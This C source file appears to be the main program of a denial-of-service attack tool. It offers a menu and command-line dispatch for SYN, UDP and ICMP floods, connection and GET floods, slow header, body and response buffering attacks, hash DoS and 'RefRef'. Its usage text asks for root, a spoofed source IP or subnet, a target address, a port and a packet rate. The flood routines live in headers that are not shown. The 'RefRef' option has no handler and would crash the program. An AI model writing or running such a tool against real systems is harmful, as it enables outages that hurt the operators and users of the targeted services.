#include "header.h"

#include "ddos/get_flood.h"
#include "ddos/icmp_flood.h"
#include "ddos/syn_flood.h"
#include "ddos/udp_flood.h"
#include "ddos/conn_flood.h"
#include "ddos/hash_dos.h"
#include "ddos/header_buffering.h"
#include "ddos/body_buffering.h"
#include "ddos/response_buffering.h"

#define __SIZE_OF_INPUT__ 200
#define __MAX_TOKEN_NUM__ 20
#define __ATTACK_TYPES__ 10

char input[__SIZE_OF_INPUT__];
char *tokens[__MAX_TOKEN_NUM__ ];
void (*usage_functions[__ATTACK_TYPES__ + 1])(void) = { NULL,
				syn_flood_print_usage,
				udp_flood_print_usage,
				icmp_flood_print_usage,
				conn_flood_print_usage,
				get_flood_print_usage,
				header_buffering_print_usage,
				body_buffering_print_usage,
				response_buffering_print_usage,
				hash_dos_print_usage
			};
void (*main_functions[__ATTACK_TYPES__ + 1])(char *[]) = { NULL,
				syn_flood_main,
				udp_flood_main,
				icmp_flood_main,
				conn_flood_main,
				get_flood_main,
				header_buffering_main,
				body_buffering_main,
				response_buffering_main,
				hash_dos_main
			};

void get_input(void)
{
	printf("$ ");
	fgets(input, __SIZE_OF_INPUT__, stdin);
	return;
}

void make_tokens(void)
{
	int i = 0;
	for (i = 0; i < __MAX_TOKEN_NUM__; i++)
		tokens[i] = NULL;
	i = 0;
	tokens[i] = strtok(input, " ");
	while (tokens[i] != NULL) {
		i++;
		tokens[i] = strtok(NULL, " ");
	}
	return;
}

attack_type argv_to_tokens(char *argv[], int argc)
{
	for (int i = 2; i < argc; i++)
		tokens[i - 2] = argv[i];
	tokens[argc - 2] = NULL;
	attack_type type;
	if (!strcmp(argv[1], "syn") ||
			!strcmp(argv[1], "SYN") ||
			!strcmp(argv[1], "1"))
		type = SYN;
	else if (!strcmp(argv[1], "udp") ||
					 !strcmp(argv[1], "UDP") ||
					 !strcmp(argv[1], "2"))
		type = UDP;
	else if (!strcmp(argv[1], "icmp") ||
					 !strcmp(argv[1], "ICMP") ||
					 !strcmp(argv[1], "3"))
		type = ICMP;
	else if (!strcmp(argv[1], "conn") ||
					 !strcmp(argv[1], "CONN") ||
					 !strcmp(argv[1], "4"))
		type = CONN;
	else if (!strcmp(argv[1], "get") ||
					 !strcmp(argv[1], "GET") ||
					 !strcmp(argv[1], "5"))
		type = GET;
	else if (!strcmp(argv[1], "head") ||
					 !strcmp(argv[1], "HEAD") ||
					 !strcmp(argv[1], "6"))
		type = HEAD;
	else if (!strcmp(argv[1], "body") ||
					 !strcmp(argv[1], "BODY") ||
					 !strcmp(argv[1], "7"))
		type = BODY;
	else if (!strcmp(argv[1], "resp") ||
					 !strcmp(argv[1], "RESP") ||
					 !strcmp(argv[1], "8"))
		type = RESP;
	else if (!strcmp(argv[1], "hash") ||
					 !strcmp(argv[1], "HASH") ||
					 !strcmp(argv[1], "9"))
		type = HASH;
	else if (!strcmp(argv[1], "ref") ||
					 !strcmp(argv[1], "REF") ||
					 !strcmp(argv[1], "10"))
		type = REF;
	else
		type = NONE;
	return type;
}

int choose_running_type(void)
{
	printf("== Choose Running Type\n");
	printf("== 1. Number Based\n"
			"== 2. Over Time\n");
	printf("== ");
	get_input();
	int t = atoi(input);
	while (t <= 0 || t > 2) {
		printf("Input should be over 0 AND <=2\n");
		get_input();
		t = atoi(input);
	}
	return t;
}

attack_type type_choose_attack(void)
{
	printf("\n"
			"   [Serverless Attacks]\n"
			"1. SYN flooding\n"
			"2. UDP flooding\n"
			"3. ICMP flooding\n"
			"\n"
			"   [Server Required Attacks]\n"
			"4. Connection flooding\n"
			"5. Get flooding\n"
			"6. Header buffering\n"
			"7. Body buffering\n"
			"8. Response buffering\n"
			"9. Hash Dos\n"
			"10. RefRef\n\n");
	get_input();
	attack_type t = atoi(input);
	while (t <= 0 || t > 10) {
		printf("Input should be over 0 AND <=10\n");
		get_input();
		t = atoi(input);
	}
	return t;
}

#define DRAW_HEIGHT 7
#define DRAW_WIDTHB 8
#define DRAW_WIDTHS 6

void print_main(void)
{
	char num[11];  // here too one extra room is needed for the '\0'
	char c;  // for option
	int i, j, k;
	// declaring char 2D arrays and initializing with hash-printed digits
	char upp_d[DRAW_HEIGHT][DRAW_WIDTHB] = { " ####  ", " #   # ", " #   # ",
					" #   # ", " #   # ", " #   # ", " ####  " },
			low_o[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "       ",
					" ##### ", " #   # ", " #   # ", " ##### " },
			upp_s[DRAW_HEIGHT][DRAW_WIDTHB] = { " ##### ", " #     ", " #     ",
					" ##### ", "     # ", "     # ", " ##### " },
			upp_u[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", " #   # ", " #   # ",
					" #   # ", " #   # ", " #   # ", " ##### " },
			low_t[DRAW_HEIGHT][DRAW_WIDTHB] = { "       ", "       ", "   #   ",
					" ##### ", "   #   ", "   #   ", "   ### " },
			low_i[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "     ", "  #  ",
					"     ", "  #  ", "  #  ", "  #  " },
			low_l[DRAW_HEIGHT][DRAW_WIDTHS] = { "     ", "  #  ", "  #  ",
					"  #  ", "  #  ", "  #  ", "  #  " };
	printf("-----------------------------\n");
	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_d[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_d[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", low_o[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_s[i][j]);
		}
		printf("|");
		printf("\n");
	}
	for (i = 0; i < DRAW_HEIGHT; i++) {
		printf("|");
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", upp_u[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHB; j++) {
			printf("%c", low_t[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHS; j++) {
			printf("%c", low_i[i][j]);
		}
		for (j = 0; j < DRAW_WIDTHS; j++) {
			printf("%c", low_l[i][j]);
		}
		printf("    |");
		printf("\n");
	}
	printf("-----------------------------\n");
	return;
}

void print_usage(char *argv[])
{
	printf("Usage: sudo %s [attack_types] "
				 "[Src-IP] [Dest-IP] [Dest-Port] [#Request/s] ...\n",
			argv[0]);
	printf("Attack Types: \n"
				 "   [Serverless Attacks]\n"
				 "syn,  SYN,   1        SYN Flooding Attack\n"
				 "udp,  UDP,   2        UDP Flooding Attack\n"
				 "icmp, ICMP,  3        ICMP Flooding Attack\n"
				 "   [Server Required Attacks]\n"
				 "conn, CONN,  4        Connection Flooding Attack\n"
				 "get,  GET,   5        GET Flooding Attack\n"
				 "head, HEAD,  6        Header Buffering Attack\n"
				 "body, BODY,  7        Body Buffering Attack\n"
				 "resp, RESP,  8        Response Buffering Attack\n"
				 "hash, HASH,  9        Hash Dos Attack\n"
				 "ref,  REF,  10        RefRef Attack\n");
	printf("Source IP Address:\n"
				 "    The format is [IPv4 Address]/[Subnet Masking(Optional)].\n"
				 "    IPv4 Address format is XXX.XXX.XXX.XXX.\n"
				 "    Subnet Masking format is 0 ~ 32 integer. It is optional.\n");
	printf("Destination IP Address:\n"
				 "    The format is [IPv4 Address]/[Subnet Masking(Optional)].\n"
				 "    IPv4 Address format is XXX.XXX.XXX.XXX.\n"
				 "    Subnet Masking format is 0 ~ 32 integer. It is optional.\n");
	printf("Destination Port Number:\n"
				 "    The format is 0 ~ 65,535 integer.\n");
	printf("Number of Requests Per Second:\n"
				 "    The format is unsigned integer.\n"
				 "    It is a number of Packet sent to Dest every second.\n");
	return;
}

int run_attacks(attack_type type, bool is_command)
{
	if (type == NONE)
		return -1;
	if (!is_command) {
		usage_functions[type]();
		get_input();
		make_tokens();
	}
	main_functions[type](tokens);
	return 0;
}

int main(int argc, char *argv[])
{
	int mode;
	attack_type type;

	if (argc == 1) {
		print_main();
		while (1) {
			type = type_choose_attack();
			if (run_attacks(type, false) < 0)
				print_main();
		}
	} else {
		type = argv_to_tokens(argv, argc);
		if (run_attacks(type, true) < 0) {
			print_usage(argv);
		}
	}
	return (0);
}
